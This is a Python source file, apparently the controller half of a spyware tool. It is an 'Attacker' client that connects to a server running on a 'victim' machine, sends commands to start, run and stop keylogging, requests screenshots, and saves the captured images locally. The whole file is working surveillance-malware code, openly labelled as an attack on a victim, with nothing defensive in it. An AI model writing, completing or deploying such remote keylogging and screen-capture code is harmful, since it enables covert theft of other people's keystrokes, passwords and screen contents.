import socket
import sys
import random
import json
import warnings
from dataclasses import dataclass
from typing import Optional
from clientExceptions import *
import os
from PIL import Image
import io
import base64

SHELL_ARGUMENTS = sys.argv

# the victim ip and port are shell arguments (but they have default values)
TARGET_IP = '127.0.0.1' if len(SHELL_ARGUMENTS) < 2 else SHELL_ARGUMENTS[1]
TARGET_PORT = 5000 if len(SHELL_ARGUMENTS) < 3 else SHELL_ARGUMENTS[2]

SOCK_BYTE_LIMIT = 4096


# Convert Base64 to Image
def b64_2_img(data):
    buff = io.BytesIO(base64.b64decode(data))
    return Image.open(buff)


class FileBuilder:

    @staticmethod
    def image_from_bytes(path: str, bytes_content: bytes):
        with open(path, 'wb') as text_file:
            text_file.write(bytes_content)

    @staticmethod
    def text_from_bytes(path: str, bytes_content: bytes):
        with open(path, 'wb') as image_file:
            image_file.write(bytes_content)

    @staticmethod
    def json_from_bytes(path: str, bytes_content: bytes):
        with open(path, 'wb') as json_file:
            json_file.write(bytes_content)


@dataclass
class ResponseInfo:
    content_type: str
    size: int
    num_of_messages: int


@dataclass
class Response:
    status: Optional[str]
    bytes_content: bytes
    info: ResponseInfo


@dataclass
class JSONResponse(Response):
    content: str
    dictionary: dict


@dataclass
class TextResponse(Response):
    content: str


@dataclass
class ImageResponse(Response):
    path: str
    save: bool = True


class Attacker:
    """ A class for representing the attacker, who is the client.
    The attacker can request screenshots and key-logging information from the victim's computer, and
    the victim's server will serve the requests - therefore it is the server.
    Currently, the attacker is limited and can only communicate with a single target.
    """

    def __init__(self, target_ip=TARGET_IP, target_port=TARGET_PORT):
        self._target_ip = target_ip
        self._target_port = target_port
        self._socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    @property
    def target_ip(self):
        return self._target_ip

    @property
    def target_port(self):
        return self._target_port

    def connect(self):
        self._socket.connect((self._target_ip, self._target_port))

    def send(self, content):
        if isinstance(content, str):
            content = content.encode('utf-8')
        self._socket.send(content)

    def _build_json_response(self, response_bytes: bytes, response_info: ResponseInfo):
        content = response_bytes.decode('utf-8')
        try:
            dictionary = json.loads(content)
        except json.JSONDecodeError:
            warnings.warn("Invalid JSON response received from the server!")
            dictionary = {'status': 'failure'}
        response_obj = JSONResponse(status=dictionary['status'], bytes_content=response_bytes, info=response_info,
                                    content=content, dictionary=dictionary)
        return response_obj

    def _build_text_respnose(self, response_bytes: bytes, response_info: ResponseInfo):
        content = response_bytes.decode('utf-8')
        response_obj = TextResponse(status=None, bytes_content=response_bytes, info=response_info,
                                    content=content)

        return response_obj

    def _build_image_response(self, response_bytes: bytes, response_info: ResponseInfo, path: str = None, save=True):
        if path is None:
            path = "victim_screenshot.png"
        return ImageResponse(status='success', bytes_content=response_bytes, info=response_info, path=path, save=save)

    def receive_and_process(self):
        preparation_response_bytes = self.receive()
        response_info = self.process_preparation_response(preparation_response_bytes)
        response_bytes = self.fetch_in_chunks(response_info.num_of_messages)
        if response_info.content_type == 'json':
            response_obj = self._build_json_response(response_bytes=response_bytes, response_info=response_info)
        elif response_info.content_type == 'text':
            response_obj = self._build_text_respnose(response_bytes=response_bytes, response_info=response_info)
        elif "image" in response_info.content_type:  # TODO: implement image
            response_obj = self._build_image_response(response_bytes=response_bytes, response_info=response_info,
                                                      path=os.getcwd())
        else:
            raise ServerInvalidContentType()
        self.process_response(response_obj)

    def receive(self):
        response_bytes = self._socket.recv(SOCK_BYTE_LIMIT)
        return response_bytes  # returns the response in bytes

    def process_preparation_response(self, prep_response_bytes):
        response_json = prep_response_bytes.decode('utf-8')
        try:
            response_dict = json.loads(response_json)
        except json.JSONDecodeError:
            warnings.warn("Invalid (first) response from server - couldn't convert to JSON format!!!")
            return None
        response_info = ResponseInfo(
            content_type=response_dict['content_type'], size=response_dict['size'],
            num_of_messages=response_dict['num_of_messages'])
        return response_info

    def fetch_in_chunks(self, num_of_messages):
        """ process a preparation request - fetch the whole message in parts from the server"""
        print("processing preparation request")
        bytes_buffer = b''
        for i in range(num_of_messages):
            message = self.receive()
            print(f"received {len(message)} bytes")
            bytes_buffer += message  # TODO: later put mutex here
        return bytes_buffer

    def process_json_success(self, response: JSONResponse):
        print("processing json success!!")
        print(f"received the message: {response.content}")

    def process_json_failure(self, response: JSONResponse):
        pass

    def process_text_success(self, response: TextResponse):
        pass

    def process_text_failure(self, response: TextResponse):
        pass

    def process_image_success(self, response: ImageResponse):
        print("processing an image...")
        if response.save:
            print(response.bytes_content)
            #FileBuilder.image_from_bytes("victim_screenshot.png", response.bytes_content)
            my_image = b64_2_img(response.bytes_content)
            my_image.save("victimshot.png")
            print("created an image successfully")
        else:
            pass

    def process_image_failure(self, response: ImageResponse):
        pass

    def process_response(self, response: Response):
        if isinstance(response, JSONResponse):
            print("processing a json response")
            if response.status == 'success':  # the message was successful.
                self.process_json_success(response=response)
            elif response.status == 'failure':
                self.process_json_failure(response=response)
            else:
                raise ServerInvalidResponseStatus()
        elif isinstance(response, TextResponse):
            if response.status == 'success':  # the message was successful.
                self.process_text_success(response=response)
            elif response.status == 'failure':
                self.process_text_failure(response=response)
            else:
                raise ServerInvalidResponseStatus()
        elif isinstance(response, ImageResponse):
            if response.status == 'success':  # the message was successful.
                self.process_image_success(response=response)
            elif response.status == 'failure':
                self.process_image_failure(response=response)
            else:
                raise ServerInvalidResponseStatus()
        else:
            print(type(response))
            raise ServerInvalidContentType()

    def request_screenshot(self):
        request = json.dumps({
            'type': 'request',
            'resource': 'screenshot'
        })
        self.send(request)

    def start_keylogging(self):
        """ start collecting key-logging info."""

        request = json.dumps({
            'type': 'action',
            'action': 'start_keylogging',
        })
        self.send(request)

    def log_for(self, duration: int = 5):
        request = json.dumps({
            'type': 'action',
            'action': 'log_for',
            'duration': duration
        })
        self.send(request)

    def stop_keylogging(self):  # TODO: action or request?
        request = json.dumps({
            'type': 'request',
            'resource': 'keylogging_report'
        })
        self.send(request)

    def close(self):
        self._socket.close()


def main():
    attacker = Attacker()
    attacker.connect()
    attacker.request_screenshot()
    attacker.receive_and_process()
    attacker.close()


if __name__ == '__main__':
    main()
